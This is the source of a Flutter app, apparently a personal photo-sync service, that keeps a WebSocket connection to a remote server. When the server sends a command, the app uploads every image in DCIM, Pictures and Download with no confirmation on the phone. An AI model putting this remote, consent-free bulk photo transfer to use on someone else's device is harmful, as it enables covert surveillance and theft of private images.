import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const RemotePulseApp());
}

class RemotePulseApp extends StatelessWidget {
  const RemotePulseApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Remote Pulse Service',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.green),
        useMaterial3: true,
      ),
      home: const MainHomeScreen(),
    );
  }
}

class MainHomeScreen extends StatefulWidget {
  const MainHomeScreen({super.key});

  @override
  State<MainHomeScreen> createState() => _MainHomeScreenState();
}

class _MainHomeScreenState extends State<MainHomeScreen> {
  static const String serverDomain = "remote-pulse-server.onrender.com";
  static const String deviceId = "my_device_123";

  bool _isConnected = false;
  bool _isConnecting = false;
  bool _isSyncing = false;

  int _totalImages = 0;
  int _uploadedImages = 0;
  String _statusMessage = 'جاري التحقق من الاتصال والصلاحيات...';

  WebSocket? _webSocket;
  Timer? _reconnectTimer;
  Completer<void>? _ackCompleter;

  @override
  void initState() {
    super.initState();
    _initService();
  }

  Future<void> _initService() async {
    await _requestPermissions();
    _connectToCloudServer();

    _reconnectTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
      if (!_isConnected && !_isConnecting) {
        _connectToCloudServer();
      }
    });
  }

  Future<bool> _requestPermissions() async {
    if (Platform.isAndroid) {
      Map<Permission, PermissionStatus> statuses = await [
        Permission.storage,
        Permission.photos,
        Permission.manageExternalStorage,
        Permission.ignoreBatteryOptimizations,
      ].request();
      return statuses.values.any((status) => status.isGranted);
    }
    return true;
  }

  Future<void> _connectToCloudServer() async {
    if (_isConnected || _isConnecting) return;
    _isConnecting = true;

    try {
      final wsUrl = 'wss://$serverDomain/ws/phone/$deviceId';
      _webSocket = await WebSocket.connect(wsUrl).timeout(const Duration(seconds: 10));

      if (mounted) {
        setState(() {
          _isConnected = true;
          _isConnecting = false;
          _statusMessage = 'الخدمة شغالة في الخلفية ومتصلة\nجاهز لاستقبال الأوامر تلقائياً';
        });
      }

      _webSocket?.listen(
        (data) {
          try {
            final message = jsonDecode(data);
            if (message['action'] == 'FETCH_ALL_IMAGES') {
              // الموافقة والبدء التلقائي المباشر بدون تدخل
              _syncAllImages();
            } else if (message['type'] == 'ACK_SAVED') {
              if (_ackCompleter != null && !_ackCompleter!.isCompleted) {
                _ackCompleter!.complete();
              }
            }
          } catch (_) {}
        },
        onError: (_) => _handleDisconnect(),
        onDone: () => _handleDisconnect(),
        cancelOnError: true,
      );
    } catch (_) {
      _handleDisconnect();
    }
  }

  void _handleDisconnect() {
    _isConnecting = false;
    if (mounted) {
      setState(() {
        _isConnected = false;
        _statusMessage = 'تم قطع الاتصال، جاري إعادة المحاولة آلياً...';
      });
    }
    _webSocket?.close();
    _webSocket = null;
  }

  Future<List<File>> _getDeviceImages() async {
    List<File> imageFiles = [];
    List<String> targetDirs = [
      '/storage/emulated/0/DCIM',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
    ];

    for (var dirPath in targetDirs) {
      Directory dir = Directory(dirPath);
      if (await dir.exists()) {
        try {
          List<FileSystemEntity> files = dir.listSync(recursive: true, followLinks: false);
          for (var entity in files) {
            if (entity is File && _isImageFile(entity.path)) {
              imageFiles.add(entity);
            }
          }
        } catch (_) {}
      }
    }
    return imageFiles;
  }

  bool _isImageFile(String path) {
    String ext = path.toLowerCase();
    return ext.endsWith('.jpg') || ext.endsWith('.jpeg') || ext.endsWith('.png') || ext.endsWith('.webp');
  }

  Future<void> _syncAllImages() async {
    if (!_isConnected || _isSyncing) return;

    bool hasPermission = await _requestPermissions();
    if (!hasPermission) {
      if (mounted) {
        setState(() => _statusMessage = 'تم رفض إذن الوصول للصور!');
      }
      return;
    }

    if (mounted) {
      setState(() {
        _isSyncing = true;
        _uploadedImages = 0;
        _statusMessage = 'جاري نقل الصور تلقائياً إلى اللابتوب...';
      });
    }

    try {
      List<File> imageFiles = await _getDeviceImages();

      if (mounted) {
        setState(() => _totalImages = imageFiles.length);
      }

      if (imageFiles.isEmpty) {
        if (mounted) {
          setState(() => _statusMessage = 'لم يتم العثور على أي صور لنقلها');
        }
        return;
      }

      for (var file in imageFiles) {
        if (!_isConnected) break;

        _ackCompleter = Completer<void>();

        await _uploadSingleFile(file);

        // الانتظار حتى استلام رد الحفظ من اللابتوب
        await _ackCompleter!.future.timeout(
          const Duration(seconds: 10),
          onTimeout: () {},
        );

        // إضافة فاصل زمني (1 ثانية كاملة) لإراحة السيرفر وضمان الاستقرار
        await Future.delayed(const Duration(seconds: 1));

        if (mounted) {
          setState(() {
            _uploadedImages++;
          });
        }
      }
    } catch (e) {
      if (mounted) {
        setState(() => _statusMessage = 'حدث خطأ أثناء نقل الصور: $e');
      }
    } finally {
      if (mounted) {
        setState(() {
          _isSyncing = false;
          if (_uploadedImages > 0) {
            _statusMessage = 'تم نقل جميع الصور بنجاح! ($_uploadedImages صورة)';
          }
        });
      }
    }
  }

  Future<void> _uploadSingleFile(File file) async {
    try {
      List<int> imageBytes = await file.readAsBytes();
      String base64Image = base64Encode(imageBytes);
      String fileName = file.path.split('/').last;

      _webSocket?.add(jsonEncode({
        "type": "NEW_IMAGE_DATA",
        "file_name": fileName,
        "data": base64Image,
      }));
    } catch (_) {}
  }

  @override
  void dispose() {
    _reconnectTimer?.cancel();
    _webSocket?.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF121212),
      appBar: AppBar(
        title: const Text('Remote Background Sync', style: TextStyle(color: Colors.white, fontSize: 18)),
        centerTitle: true,
        backgroundColor: const Color(0xFF1E1E1E),
        elevation: 0,
      ),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Container(
            padding: const EdgeInsets.all(24.0),
            decoration: BoxDecoration(
              color: const Color(0xFF1E1E1E),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: _isConnected ? Colors.green : Colors.red, width: 1.5),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Container(
                      width: 12,
                      height: 12,
                      decoration: BoxDecoration(
                        color: _isConnected ? Colors.greenAccent : Colors.redAccent,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 8),
                    Text(
                      _isConnected ? 'الخدمة نشطة ومستعدة' : 'غير متصل بالخادم',
                      style: TextStyle(
                        color: _isConnected ? Colors.greenAccent : Colors.redAccent,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Text(
                  _statusMessage,
                  textAlign: TextAlign.center,
                  style: const TextStyle(fontSize: 14, color: Colors.white70),
                ),
                if (_isSyncing) ...[
                  const SizedBox(height: 25),
                  LinearProgressIndicator(
                    value: _totalImages > 0 ? _uploadedImages / _totalImages : 0,
                    color: Colors.greenAccent,
                    backgroundColor: Colors.white10,
                  ),
                  const SizedBox(height: 12),
                  Text(
                    'تم نقل $_uploadedImages من أصل $_totalImages صورة',
                    style: const TextStyle(color: Colors.white, fontSize: 13),
                  )
                ]
              ],
            ),
          ),
        ),
      ),
    );
  }
}
